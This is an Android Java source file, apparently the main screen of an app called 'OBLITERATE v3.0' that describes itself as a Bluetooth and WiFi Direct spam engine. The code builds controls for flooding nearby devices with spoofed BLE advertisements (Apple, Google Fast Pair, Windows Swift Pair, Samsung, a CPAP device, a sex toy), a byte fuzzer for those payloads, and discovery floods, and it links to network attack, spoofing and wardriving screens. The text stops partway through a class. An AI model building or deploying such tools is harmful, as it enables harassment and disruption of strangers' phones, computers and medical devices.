package com.obliterate.btspam;

import android.Manifest;
import android.app.AlertDialog;
import android.bluetooth.*;
import android.bluetooth.le.*;
import android.content.*;
import android.content.pm.PackageManager;
import android.graphics.Typeface;
import android.location.LocationManager;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import android.net.wifi.p2p.*;
import android.os.*;
import android.text.method.ScrollingMovementMethod;
import android.view.*;
import android.widget.*;

import java.io.*;
import java.net.*;
import java.util.*;

/**
 * OBLITERATE v3.0 — BT + WiFi Direct Spam Engine
 * Fixed UI. No lambdas. No anonymous inner class bullshit.
 */
public class MainActivity extends android.app.Activity {

    // ── Constants ──────────────────────────────
    private static final int REQUEST_ENABLE_BT = 1;
    private static final int REQUEST_PERMISSIONS = 3;
    private static final int REQUEST_STORAGE = 4;
    private static final long SCAN_PERIOD = 12000;

    private static final int FUZZ_SWIFT_PAIR = 0;
    private static final int FUZZ_FAST_PAIR_CD8256 = 1;
    private static final int FUZZ_FAST_PAIR_F52494 = 2;
    private static final int FUZZ_FAST_PAIR_718FA4 = 3;
    private static final int FUZZ_FAST_PAIR_821F66 = 4;
    private static final int FUZZ_FAST_PAIR_92BBBD = 5;
    private static final int FUZZ_APPLE_NEARBY_ACTION = 6;
    private static final int FUZZ_APPLE_AIRDROP = 7;
    private static final int FUZZ_APPLE_HANDOFF = 8;
    private static final int FUZZ_APPLE_TETHERING = 9;
    private static final int FUZZ_APPLE_IBEACON = 10;
    private static final int FUZZ_APPLE_FIND_MY_SEED = 11;
    private static final int FUZZ_SAMSUNG_BUDS_SEED = 12;
    private static final int FUZZ_SAMSUNG_WATCH_SEED = 13;
    private static final int FUZZ_LOVESPOUSE_PLAY = 14;
    private static final int FUZZ_LOVESPOUSE_STOP = 15;
    private static final int FUZZ_AIRSENSE_SEED = 16;
    private static final int FUZZ_NEARBY_SHARE_SEED = 17;
    private static final int FUZZ_EDDYSTONE_UID = 18;
    private static final int FUZZ_EDDYSTONE_URL = 19;
    private static final int FUZZ_EXPOSURE_NOTIFY_SEED = 20;

    private static final String[] FUZZ_PROFILE_LABELS = {
        "🪟 Swift Pair — Windows",
        "🤖 Fast Pair seed CD8256",
        "🤖 Fast Pair seed F52494",
        "🤖 Fast Pair seed 718FA4",
        "🤖 Fast Pair seed 821F66",
        "🤖 Fast Pair seed 92BBBD",
        "🍎 Apple NearbyAction seed",
        "🍎 Apple AirDrop seed",
        "🍎 Apple Handoff seed",
        "🍎 Apple Tethering seed",
        "📍 Apple iBeacon seed",
        "🔍 Apple Find My-like seed",
        "⭐ Samsung Buds seed",
        "⭐ Samsung Watch seed",
        "💗 LoveSpouse Play seed",
        "💗 LoveSpouse Stop seed",
        "😴 AirSense CPAP seed",
        "📤 Nearby Share seed",
        "📍 Eddystone UID seed",
        "🔗 Eddystone URL seed",
        "🦠 Exposure Notify seed"
    };

    // ── Bluetooth ──────────────────────────────
    private BluetoothAdapter btAdapter;
    private BluetoothLeScanner leScanner;
    private BleScanCb activeBleScanCb;
    private volatile boolean isDiscSpam = false, isPairSpam = false, isConnSpam = false, isBleSpam = false;
    private final ArrayList<BluetoothDevice> discoveredDevices = new ArrayList<>();
    private ArrayAdapter<String> deviceListAdapter;
    private final Map<String, String> deviceNameMap = java.util.Collections.synchronizedMap(new HashMap<String, String>());

    // ── WiFi Direct ────────────────────────────
    private WifiP2pManager wifiP2pManager;
    private WifiP2pManager.Channel wifiChannel;
    private volatile boolean isWifiSpam = false;
    private final ArrayList<WifiP2pDevice> wifiPeers = new ArrayList<>();

    // ── Phone Native Attacks ───────────────────
    private WifiManager wifiManager;
    private WifiManager.MulticastLock multicastLock;
    private volatile boolean isProbeFlood = false, isBtNameTurbo = false;
    private volatile boolean isMdnsSpoof = false, isSsdpSpoof = false, isHoneypot = false;
    private volatile int probeFloodNetId = -1;
    private BluetoothDevice inspectTarget = null;
    private AdvertiseCallback fuzzCallback = null, activeBleAdCb = null, activeBleFireCb = null;
    private volatile boolean isFuzzActive = false;

    // ── Common ─────────────────────────────────
    private Handler mainHandler = new Handler(Looper.getMainLooper());
    private PowerManager.WakeLock wakeLock;

    // ── UI refs captured before background threads ──
    private volatile String capturedSpoofName = null;
    private volatile String capturedSubnetPrefix = null;

    // ── Active dialog (dismiss on destroy) ──
    private AlertDialog activeInspectDialog;

    // ── Pending export action after storage grant ──
    private Runnable pendingStorageAction;

    // ── UI ─────────────────────────────────────
    private TextView statusText, logText, deviceCountText;
    private Button btnScan, btnDiscSpam, btnPairSpam, btnConnSpam, btnBleSpam, btnWifiSpam, btnStopAll;
    private Button btnBleFire, btnBleStop, btnBleCycle;
    private Spinner bleModeSpinner;
    private ArrayAdapter<String> bleModeAdapter;
    private ListView deviceListView;
    private EditText spoofNameInput, customPayloadInput, subnetInput;
    private volatile boolean isBleTargetActive = false;
    private volatile boolean isCycling = false;
    private volatile boolean stopNetbiosScan = false;
    private volatile boolean stopSmbScan = false;
    private volatile boolean stopPrinterScan = false;
    private volatile boolean stopNetScan = false;   // legacy stop-all alias
    private int currentBleMode = 0;

    // ═══════════════════════════════════════════
    //  LIFECYCLE
    // ═══════════════════════════════════════════

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        initBluetooth();
        initWifiDirect();
        initPhoneAttacks();
        initUI();
        // Register SDP UUID receiver for BT Inspector
        IntentFilter uuidF = new IntentFilter(BluetoothDevice.ACTION_UUID);
        registerReceiver(mBtUuidReceiver, uuidF);
        requestFullScreen();
        log("+====================================+");
        log("|   OBLITERATE v3.0                 |");
        log("|   BT + WIFI + NETWORK ATTACKS     |");
        log("+====================================+");
        log("  Armed. Pick a weapon.");
    }

    @Override
    protected void onDestroy() {
        stopAll();
        mainHandler.removeCallbacksAndMessages(null);
        try { unregisterReceiver(mBtReceiver); } catch (Exception e) {}
        try { unregisterReceiver(mWifiReceiver); } catch (Exception e) {}
        try { unregisterReceiver(mBtUuidReceiver); } catch (Exception e) {}
        if (activeInspectDialog != null) try { activeInspectDialog.dismiss(); } catch (Exception e) {}
        releaseWakeLock();
        super.onDestroy();
    }

    // ═══════════════════════════════════════════
    //  INIT — BLUETOOTH
    // ═══════════════════════════════════════════

    private void initBluetooth() {
        BluetoothManager bm = (BluetoothManager) getSystemService(Context.BLUETOOTH_SERVICE);
        if (bm != null) {
            btAdapter = bm.getAdapter();
            leScanner = btAdapter != null ? btAdapter.getBluetoothLeScanner() : null;
        }
        if (btAdapter == null) { log("✕ No Bluetooth adapter"); return; }
        if (!btAdapter.isEnabled()) {
            startActivityForResult(new Intent(BluetoothAdapter.ACTION_REQUEST_ENABLE), REQUEST_ENABLE_BT);
        }
        IntentFilter f = new IntentFilter();
        f.addAction(BluetoothDevice.ACTION_FOUND);
        f.addAction(BluetoothAdapter.ACTION_DISCOVERY_STARTED);
        f.addAction(BluetoothAdapter.ACTION_DISCOVERY_FINISHED);
        f.addAction(BluetoothAdapter.ACTION_STATE_CHANGED);
        f.addAction(BluetoothDevice.ACTION_BOND_STATE_CHANGED);
        registerReceiver(mBtReceiver, f);
    }

    // ═══════════════════════════════════════════
    //  INIT — WIFI DIRECT
    // ═══════════════════════════════════════════

    private void initWifiDirect() {
        wifiP2pManager = (WifiP2pManager) getSystemService(Context.WIFI_P2P_SERVICE);
        if (wifiP2pManager == null) { log("⚠ No WiFi Direct support"); return; }
        wifiChannel = wifiP2pManager.initialize(this, getMainLooper(), null);
        IntentFilter f = new IntentFilter();
        f.addAction(WifiP2pManager.WIFI_P2P_PEERS_CHANGED_ACTION);
        f.addAction(WifiP2pManager.WIFI_P2P_CONNECTION_CHANGED_ACTION);
        f.addAction(WifiP2pManager.WIFI_P2P_THIS_DEVICE_CHANGED_ACTION);
        registerReceiver(mWifiReceiver, f);
        log("✓ WiFi Direct ready");
    }

    // ═══════════════════════════════════════════
    //  INIT — PHONE NATIVE ATTACKS
    // ═══════════════════════════════════════════

    private void initPhoneAttacks() {
        wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (wifiManager == null) { log("⚠ No WiFi manager"); return; }
        multicastLock = wifiManager.createMulticastLock("OB:Multicast");
        multicastLock.setReferenceCounted(false);
        log("✓ Phone native attacks ready");
    }

    // ═══════════════════════════════════════════
    //  UI — FIXED LAYOUT
    // ═══════════════════════════════════════════

    @SuppressWarnings("unchecked")
    private void initUI() {
        // Get status bar height for proper top padding
        int statusBarH = 72; // safe default
        try {
            int resId = getResources().getIdentifier("status_bar_height", "dimen", "android");
            if (resId > 0) statusBarH = getResources().getDimensionPixelSize(resId);
        } catch (Exception e) {}

        // Build root layout
        LinearLayout content = new LinearLayout(this);
        content.setOrientation(LinearLayout.VERTICAL);
        content.setBackgroundColor(0xFF0A0A0A);
        content.setPadding(16, statusBarH + 12, 16, 24);

        // ── Title ──
        content.addView(mkLabel("☠  OBLITERATE  v3.0", 0xFFFF2222, 22));
        content.addView(mkLabel("[ bt + wifi direct assault ]", 0xFF888888, 11));

        // BT Tools button
        Button btnBtTools = mkBtn("🔍  BT TOOLS");
        btnBtTools.setTextColor(0xFF00BFFF);
        btnBtTools.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            startActivity(new android.content.Intent(MainActivity.this, BtToolsActivity.class));
        }});
        content.addView(btnBtTools);

        // GPS Wardriving button
        Button btnGps = mkBtn("📍  GPS WARDRIVING");
        btnGps.setTextColor(0xFF00FF41);
        btnGps.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            startActivity(new android.content.Intent(MainActivity.this, GpsWardriveActivity.class));
        }});
        content.addView(btnGps);

        // Network Attacks button
        Button btnNetwork = mkBtn("🌐  NETWORK ATTACKS");
        btnNetwork.setTextColor(0xFF00BFFF);
        btnNetwork.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            startActivity(new android.content.Intent(MainActivity.this, NetworkActivity.class));
        }});
        content.addView(btnNetwork);

        // ESP32 bridge button
        Button btnEspBridge = mkBtn("📡  ESP32 CONTROL PANEL");
        btnEspBridge.setTextColor(0xFF00BFFF);
        btnEspBridge.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            startActivity(new android.content.Intent(MainActivity.this, EspControlActivity.class));
        }});
        content.addView(btnEspBridge);

        // ── Status ──
        statusText = mkLabel("⚡ READY", 0xFF00FF41, 13);
        statusText.setPadding(0, 10, 0, 0);
        content.addView(statusText);

        content.addView(mkLabel("MAIN CONSOLE:", 0xFFFFCC00, 10));
        content.addView(mkLabel("[ split-page tools live above; main keeps the BLE payload lab ]", 0xFF888888, 9));

        // Helper for 2-button rows
        LinearLayout.LayoutParams btnParams = new LinearLayout.LayoutParams(
            0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        btnParams.setMargins(4, 6, 4, 6);

        // ── Spoof name ──
        content.addView(mkLabel("SPOOF NAME:", 0xFFFFCC00, 10));
        spoofNameInput = mkEdit("📱 iPhone 15 Pro");
        spoofNameInput.setTextSize(12);
        content.addView(spoofNameInput);

        // ── Targeted BLE Spam (Flipper-style dropdown) ──
        content.addView(mkLabel("🎯 TARGETED BLE SPAM:", 0xFFFFCC00, 10));
        
        final String[] bleModes = {
            "🪟 Swift Pair (Windows)",
            "🤖 Fast Pair seed CD8256",
            "🤖 Fast Pair seed F52494",
            "🤖 Fast Pair seed 718FA4",
            "🤖 Fast Pair seed 821F66",
            "🍎 Apple — New Device seed",
            "🍎 Apple — Action Modal seed",
            "🍎 Apple — iOS 17 test pattern",
            "🍎 Apple — AirTag seed",
            "🍎 Apple — Not-Your-Device seed",
            "⭐ Samsung — Buds seed",
            "⭐ Samsung — Watch seed",
            "💗 LoveSpouse — Play seed",
            "💗 LoveSpouse — Stop seed",
            "😴 AirSense CPAP seed",
            "📛 BT Settings Flood (name spam)",
            "🔥 AGGRESSIVE Cycle (200ms)",
            "📁 AirDrop seed",
            "🔄 Handoff seed",
            "📶 Tethering seed",
            "📡 WiFi scan trigger",
            "📤 Nearby Share seed",
            "📍 Eddystone-UID",
            "🔗 Eddystone-URL",
            "📍 iBeacon",
            "🔍 Find My-like seed",
            "🦠 Exposure Notify seed",
        };
        bleModeSpinner = new Spinner(this);
        bleModeAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_dropdown_item, bleModes);
        bleModeSpinner.setAdapter(bleModeAdapter);
        bleModeSpinner.setBackgroundColor(0xFF1A1A1A);
        bleModeSpinner.setPadding(8, 8, 8, 8);
        content.addView(bleModeSpinner);

        LinearLayout bleFireRow = new LinearLayout(this);
        bleFireRow.setOrientation(LinearLayout.HORIZONTAL);
        btnBleFire = mkBtn("🔥 FIRE");
        btnBleFire.setTextColor(0xFF00FF41);
        btnBleFire.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            if (!btReady()) return;
            if (isBleTargetActive) {
                isBleTargetActive = false; isCycling = false; stopNetScan = true;
                resetBtn(btnBleFire, "🔥 FIRE");
                resetBtn(btnBleCycle, "🔄 CYCLE ALL 27 MODES");
                log("🛑 Targeted BLE stopped");
                updateStatus("READY");
                releaseWakeLock();
            } else {
                isBleTargetActive = true;
                currentBleMode = bleModeSpinner.getSelectedItemPosition();
                setBtnOn(btnBleFire, "🔥 ON");
                String mn = bleModes[currentBleMode];
                log("⚡ Firing: " + mn);
                updateStatus(mn.substring(0, Math.min(20, mn.length())));
                acquireWakeLock();
                fireTargetedBle();
            }
        }});
        LinearLayout.LayoutParams fp = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        fp.setMargins(4, 6, 4, 6);
        btnBleFire.setLayoutParams(fp);
        bleFireRow.addView(btnBleFire);
        
        btnBleStop = mkBtn("🛑 STOP");
        btnBleStop.setBackgroundColor(0xFF8B0000);
        btnBleStop.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            isBleTargetActive = false; isCycling = false; stopNetScan = true;
            resetBtn(btnBleFire, "🔥 FIRE");
            resetBtn(btnBleCycle, "🔄 CYCLE ALL 27 MODES");
            log("🛑 Targeted BLE stopped");
            updateStatus("READY");
            releaseWakeLock();
        }});
        btnBleStop.setLayoutParams(fp);
        bleFireRow.addView(btnBleStop);
        content.addView(bleFireRow);

        // Cycle all modes button
        btnBleCycle = mkBtn("🔄 CYCLE ALL 27 MODES");
        btnBleCycle.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            if (!btReady()) return;
            if (isCycling) {
                isCycling = false; isBleTargetActive = false;
                resetBtn(btnBleCycle, "🔄 CYCLE ALL 27 MODES");
                resetBtn(btnBleFire, "🔥 FIRE");
                log("🛑 Cycle stopped"); updateStatus("READY"); releaseWakeLock();
            } else {
                isCycling = true; isBleTargetActive = true; currentBleMode = 0;
                setBtnOn(btnBleCycle, "🔄 CYCLING ON");
                setBtnOn(btnBleFire, "🔥 ON");
                log("🔄 Cycling ALL 27 modes — 2s each");
                acquireWakeLock(); fireTargetedBle();
            }
        }});
        content.addView(btnBleCycle);

        // ── Byte Fuzzer Panel ──
        content.addView(mkLabel("🔬 BYTE FUZZER:", 0xFFFFCC00, 10));
        
        LinearLayout fuzzRow1 = new LinearLayout(this);
        fuzzRow1.setOrientation(LinearLayout.HORIZONTAL);
        final EditText fuzzStart = new EditText(this);
        fuzzStart.setText("0"); fuzzStart.setTextColor(0xFFE0E0E0); fuzzStart.setBackgroundColor(0xFF1A1A1A);
        fuzzStart.setTypeface(Typeface.MONOSPACE); fuzzStart.setTextSize(10);
        fuzzStart.setHint("Start"); fuzzStart.setPadding(4,8,4,8);
        LinearLayout.LayoutParams fp2 = new LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f);
        fp2.setMargins(2,4,2,4); fuzzStart.setLayoutParams(fp2);
        fuzzRow1.addView(fuzzStart);
        
        final EditText fuzzEnd = new EditText(this);
        fuzzEnd.setText("255"); fuzzEnd.setTextColor(0xFFE0E0E0); fuzzEnd.setBackgroundColor(0xFF1A1A1A);
        fuzzEnd.setTypeface(Typeface.MONOSPACE); fuzzEnd.setTextSize(10);
        fuzzEnd.setHint("End"); fuzzEnd.setPadding(4,8,4,8);
        fuzzEnd.setLayoutParams(fp2);
        fuzzRow1.addView(fuzzEnd);
        
        final EditText fuzzPos = new EditText(this);
        fuzzPos.setText("0"); fuzzPos.setTextColor(0xFFE0E0E0); fuzzPos.setBackgroundColor(0xFF1A1A1A);
        fuzzPos.setTypeface(Typeface.MONOSPACE); fuzzPos.setTextSize(10);
        fuzzPos.setHint("Pos"); fuzzPos.setPadding(4,8,4,8);
        fuzzPos.setLayoutParams(fp2);
        fuzzRow1.addView(fuzzPos);
        content.addView(fuzzRow1);
        
        LinearLayout fuzzRow2 = new LinearLayout(this);
        fuzzRow2.setOrientation(LinearLayout.HORIZONTAL);
        Button btnFuzzRun = mkBtnWide("🔬 RUN FUZZ");
        btnFuzzRun.setLayoutParams(btnParams);
        fuzzRow2.addView(btnFuzzRun);
        Button btnFuzzStop = mkBtnWide("🛑 STOP FUZZ");
        btnFuzzStop.setLayoutParams(btnParams);
        fuzzRow2.addView(btnFuzzStop);
        content.addView(fuzzRow2);

        // ── Fuzz profile/model selector ──
        content.addView(mkLabel("MODEL / PROFILE:", 0xFF888888, 10));
        final Spinner fuzzProfileSpinner = new Spinner(this);
        ArrayAdapter<String> profileAdapter = new ArrayAdapter<>(this,
            android.R.layout.simple_spinner_dropdown_item, FUZZ_PROFILE_LABELS);
        fuzzProfileSpinner.setAdapter(profileAdapter);
        fuzzProfileSpinner.setBackgroundColor(0xFF1A1A1A);
        fuzzProfileSpinner.setPadding(8, 4, 8, 4);
        content.addView(fuzzProfileSpinner);

        // ── Fuzz Presets ──
        content.addView(mkLabel("🎯 FUZZ PRESETS:", 0xFF888888, 10));
        final Spinner fuzzPresetSpinner = new Spinner(this);
        final String[] fuzzPresets = {
            "Custom (use Start/End)",
            "🪟 Swift Pair byte0: 0x00-0x02",
            "🪟 Swift Pair byte0: 0x04-0xFF",
            "🤖 Fast Pair selected seed byte0: 0x00-0xFF",
            "🤖 Fast Pair selected seed byte1: 0x00-0xFF",
            "🤖 Fast Pair selected seed byte2: 0x00-0xFF",
            "🍎 NearbyAction type byte: 0x01",
            "🍎 NearbyAction type byte: 0x05",
            "🍎 NearbyAction type byte: 0x06",
            "🍎 NearbyAction unknown type: 0x11-0xFF",
            "🍎 NearbyAction flag byte: 0x00",
            "🍎 NearbyAction flag byte: 0x80",
            "🍎 AirDrop selected byte: 0x00-0xFF",
            "⭐ Samsung Buds selected byte: 0x00-0xFF",
            "⭐ Samsung Watch selected byte: 0x00-0xFF",
            "💗 LoveSpouse command byte: 0x00-0xFF",
            "📍 Eddystone frame byte: 0x00-0xFF",
            "📤 Nearby Share first byte: 0x00-0xFF",
            "🦠 Exposure Notify first byte: 0x00-0xFF",
        };
        ArrayAdapter<String> presetAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_dropdown_item, fuzzPresets);
        fuzzPresetSpinner.setAdapter(presetAdapter);
        fuzzPresetSpinner.setBackgroundColor(0xFF1A1A1A);
        fuzzPresetSpinner.setPadding(8, 4, 8, 4);
        content.addView(fuzzPresetSpinner);
        
        // Apply preset button
        Button btnPreset = mkBtnWide("📋 APPLY PRESET");
        btnPreset.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            int idx = fuzzPresetSpinner.getSelectedItemPosition();
            if (idx == 0) return; // Custom
            // Preset definitions: {profile, start, end, position}
            int[][] presetData = {
                {FUZZ_SWIFT_PAIR, 0, 0, 0},                  // 0: custom (unused)
                {FUZZ_SWIFT_PAIR, 0x00, 0x02, 0},
                {FUZZ_SWIFT_PAIR, 0x04, 0xFF, 0},
                {FUZZ_FAST_PAIR_CD8256, 0x00, 0xFF, 0},
                {FUZZ_FAST_PAIR_CD8256, 0x00, 0xFF, 1},
                {FUZZ_FAST_PAIR_CD8256, 0x00, 0xFF, 2},
                {FUZZ_APPLE_NEARBY_ACTION, 0x01, 0x01, 0},
                {FUZZ_APPLE_NEARBY_ACTION, 0x05, 0x05, 0},
                {FUZZ_APPLE_NEARBY_ACTION, 0x06, 0x06, 0},
                {FUZZ_APPLE_NEARBY_ACTION, 0x11, 0xFF, 0},
                {FUZZ_APPLE_NEARBY_ACTION, 0x00, 0x00, 2},
                {FUZZ_APPLE_NEARBY_ACTION, 0x80, 0x80, 2},
                {FUZZ_APPLE_AIRDROP, 0x00, 0xFF, 9},
                {FUZZ_SAMSUNG_BUDS_SEED, 0x00, 0xFF, 0},
                {FUZZ_SAMSUNG_WATCH_SEED, 0x00, 0xFF, 0},
                {FUZZ_LOVESPOUSE_PLAY, 0x00, 0xFF, 11},
                {FUZZ_EDDYSTONE_UID, 0x00, 0xFF, 0},
                {FUZZ_NEARBY_SHARE_SEED, 0x00, 0xFF, 0},
                {FUZZ_EXPOSURE_NOTIFY_SEED, 0x00, 0xFF, 0},
            };
            int[] p = presetData[idx];
            fuzzProfileSpinner.setSelection(p[0]);
            fuzzStart.setText(String.valueOf(p[1]));
            fuzzEnd.setText(String.valueOf(p[2]));
            fuzzPos.setText(String.valueOf(p[3]));
            log("📋 Preset: " + fuzzPresets[idx] + " → " + FUZZ_PROFILE_LABELS[p[0]]
                + " byte " + p[3] + " = " + p[1] + "→" + p[2]);
        }});
        btnPreset.setLayoutParams(btnParams);
        content.addView(btnPreset);

        
        btnFuzzRun.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            if (!btReady()) return;
            try {
                final int start = Integer.parseInt(fuzzStart.getText().toString());
                final int end = Integer.parseInt(fuzzEnd.getText().toString());
                final int pos = Integer.parseInt(fuzzPos.getText().toString());
                final int profile = fuzzProfileSpinner.getSelectedItemPosition();
                if (start < 0 || end > 255 || end < start || pos < 0 || pos > 31) {
                    log("✕ Values: start/end 0-255, end >= start, pos 0-31");
                    return;
                }
                log("🔬 Fuzzing " + FUZZ_PROFILE_LABELS[profile] + " byte " + pos
                    + " = " + start + "→" + end);
                setBtnOn(btnFuzzRun, "🔬 FUZZING");
                isFuzzActive = true; acquireWakeLock();
                final String name = spoofNameInput.getText().toString();
                new Thread(new Runnable() { public void run() {
                    for (int b = start; b <= end && isFuzzActive; b++) {
                        final int val = b;
                        try { Thread.sleep(200); } catch (Exception e) { break; }
                        mainHandler.post(new Runnable() { public void run() {
                            if (!isFuzzActive) return;
                            BluetoothLeAdvertiser adv2 = btAdapter.getBluetoothLeAdvertiser();
                            if (adv2 == null) return;
                            AdvertiseData fd = buildFuzzAdvertiseData(profile, pos, val, name);
                            if (fd == null) return;
                            AdvertiseSettings fs = new AdvertiseSettings.Builder()
                                .setAdvertiseMode(AdvertiseSettings.ADVERTISE_MODE_LOW_LATENCY)
                                .setTxPowerLevel(AdvertiseSettings.ADVERTISE_TX_POWER_HIGH)
                                .setConnectable(false).setTimeout(0).build();
                            stopFuzzAdvertising();
                            fuzzCallback = new AdvertiseCallback() {
                                public void onStartSuccess(AdvertiseSettings s) {}
                            };
                            try { adv2.startAdvertising(fs, fd, fuzzCallback); } catch (Exception e) { log("  ✕ fuzz adv: " + e.getMessage()); }
                            log("  [" + val + "] 0x" + Integer.toHexString(val).toUpperCase());
                        }});
                    }
                    mainHandler.post(new Runnable() { public void run() {
                        stopFuzzAdvertising();
                        isFuzzActive = false; resetBtn(btnFuzzRun, "🔬 RUN FUZZ");
                        log("✅ Fuzz complete: " + start + "→" + end);
                        updateStatus("READY"); releaseWakeLock();
                    }});
                }}).start();
            } catch (NumberFormatException e) { log("✕ Invalid numbers"); }
        }});
        btnFuzzStop.setOnClickListener(new View.OnClickListener() { public void onClick(View v) {
            isFuzzActive = false; stopFuzzAdvertising(); resetBtn(btnFuzzRun, "🔬 RUN FUZZ");
            log("🛑 Fuzz stopped"); releaseWakeLock();
        }});

        // ── BLE payload input ──
        content.addView(mkLabel("BLE PAYLOAD (hex):", 0xFF888888, 10));
        customPayloadInput = mkEdit("020106FFFFFFFF");
        customPayloadInput.setTextSize(11);
        content.addView(customPayloadInput);

        // ── Stop All ──
        btnStopAll = mkBtn("🛑  STOP ALL");
        btnStopAll.setTextColor(0xFF000000);
        btnStopAll.setBackgroundColor(0xFFFF2222);
        btnStopAll.setOnClickListener(new View.OnClickListener() { public void onClick(View v) { stopAll(); }});
        content.addView(btnStopAll);

        // ── Log ──
        content.addView(mkLabel("TERMINAL:", 0xFF888888, 10));
        logText = new TextView(this);
        logText.setTextColor(0xFF00FF41);
        logText.setTextSize(10);
        logText.setTypeface(Typeface.MONOSPACE);
        logText.setBackgroundColor(0xFF0D0D0D);
        logText.setPadding(6, 6, 6, 6);
        logText.setMovementMethod(new ScrollingMovementMethod());
        logText.setHorizontallyScrolling(true);
        logText.setTextIsSelectable(true);
        logText.setLayoutParams(new LinearLayout.LayoutParams(
            LinearLayout.LayoutParams.MATCH_PARENT, dp(220)));
        content.addView(logText);

        // Wrap in ScrollView so content doesn't get cut off
        ScrollView sv = new ScrollView(this);
        sv.setBackgroundColor(0xFF0A0A0A);
        sv.addView(content);
        sv.setFillViewport(true);
        setContentView(sv);
    }

    private int dp(int px) { return ObUi.dp(this, px); }

    private TextView mkLabel(String txt, int color, int size) {
        return ObUi.label(this, txt, color, size);
    }

    private EditText mkEdit(String txt) {
        return ObUi.edit(this, txt);
    }

    private Button mkBtn(String txt) {
        return ObUi.fullButton(this, txt);
    }

    private Button mkBtnWide(String txt) {
        return ObUi.wideButton(this, txt);
    }

    // ═══════════════════════════════════════════
    //  PERMISSIONS
    // ═══════════════════════════════════════════

    private void requestFullScreen() {
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (pm != null) wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "OB:lock");
        
        // Request runtime permissions
        if (android.os.Build.VERSION.SDK_INT >= 23) {
            ArrayList<String> perms = new ArrayList<>();
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED)
                perms.add(Manifest.permission.ACCESS_FINE_LOCATION);
            if (checkSelfPermission(Manifest.permission.ACCESS_WIFI_STATE) != PackageManager.PERMISSION_GRANTED)
                perms.add(Manifest.permission.ACCESS_WIFI_STATE);
            if (checkSelfPermission(Manifest.permission.CHANGE_WIFI_STATE) != PackageManager.PERMISSION_GRANTED)
                perms.add(Manifest.permission.CHANGE_WIFI_STATE);
            // BLE runtime permissions (Android 12+)
            if (checkSelfPermission("android.permission.BLUETOOTH_ADVERTISE") != PackageManager.PERMISSION_GRANTED)
                perms.add("android.permission.BLUETOOTH_ADVERTISE");
            if (checkSelfPermission("android.permission.BLUETOOTH_SCAN") != PackageManager.PERMISSION_GRANTED)
                perms.add("android.permission.BLUETOOTH_SCAN");
            if (checkSelfPermission("android.permission.BLUETOOTH_CONNECT") != PackageManager.PERMISSION_GRANTED)
                perms.add("android.permission.BLUETOOTH_CONNECT");
            if (checkSelfPermission(Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED)
                perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            if (!perms.isEmpty())
                requestPermissions(perms.toArray(new String[0]), REQUEST_PERMISSIONS);
        }
    }

    // ═══════════════════════════════════════════
    //  SCANNING (BT + WiFi Direct)
    // ═══════════════════════════════════════════

    private void startScan() {
        if (!btReady()) return;
        synchronized (discoveredDevices) { discoveredDevices.clear(); }
        if (deviceListAdapter != null) deviceListAdapter.clear();
        if (deviceCountText != null) deviceCountText.setText("DEVICES: 0");
        deviceNameMap.clear();
        log("🔍 BT scan — 12s window...");
        if (btAdapter.isDiscovering()) btAdapter.cancelDiscovery();
        btAdapter.startDiscovery();
        updateStatus("SCANNING");

        // BLE scan
        if (leScanner != null) {
            activeBleScanCb = new BleScanCb(); BleScanCb cb = activeBleScanCb;
            try {
                leScanner.startScan(null, new ScanSettings.Builder()
                    .setScanMode(ScanSettings.SCAN_MODE_LOW_LATENCY).build(), cb);
                mainHandler.postDelayed(new Runnable() { public void run() {
                    try { leScanner.stopScan(cb); } catch (Exception e) {}
                }}, SCAN_PERIOD);
            } catch (SecurityException e) {}
        }

        // WiFi Direct discovery
        if (wifiP2pManager != null && wifiChannel != null) {
            try {
                wifiP2pManager.discoverPeers(wifiChannel, new WifiP2pManager.ActionListener() {
                    public void onSuccess() { log("📡 WiFi Direct discovery started"); }
                    public void onFailure(int code) { log("  ⚠ WiFi Direct discovery failed: " + code); }
                });
            } catch (Exception e) {}
        }

        mainHandler.postDelayed(new Runnable() { public void run() {
            btAdapter.cancelDiscovery();
            if (wifiP2pManager != null && wifiChannel != null) {
                try { wifiP2pManager.stopPeerDiscovery(wifiChannel, null); } catch (Exception e) {}
            }
            updateStatus("READY");
        }}, SCAN_PERIOD);
    }

    // ═══════════════════════════════════════════
    //  BT DISCOVERY SPAM
    // ═══════════════════════════════════════════

    private void toggleDiscSpam() {
        if (isDiscSpam) { isDiscSpam = false; btAdapter.cancelDiscovery(); resetBtn(btnDiscSpam, "📡 DISC FLOOD"); log("🛑 Disc flood stopped"); updateStatus("READY"); }
        else { if (!btReady()) return; isDiscSpam = true; setBtnOn(btnDiscSpam, "📡 DISC ON"); log("⚡ Discovery cycle started"); acquireWakeLock(); startDiscCycle(); }
    }

    private void startDiscCycle() {
        if (!isDiscSpam) return;
        if (btAdapter.isDiscovering()) btAdapter.cancelDiscovery();
        try { btAdapter.startDiscovery(); updateStatus("DISC FLOOD"); } catch (Exception e) {}
    }

    // ═══════════════════════════════════════════
    //  PHONE NATIVE — WIFI PROBE FLOOD
    // ═══════════════════════════════════════════

    private class ProbeFloodRunner implements Runnable {
        public void run() {
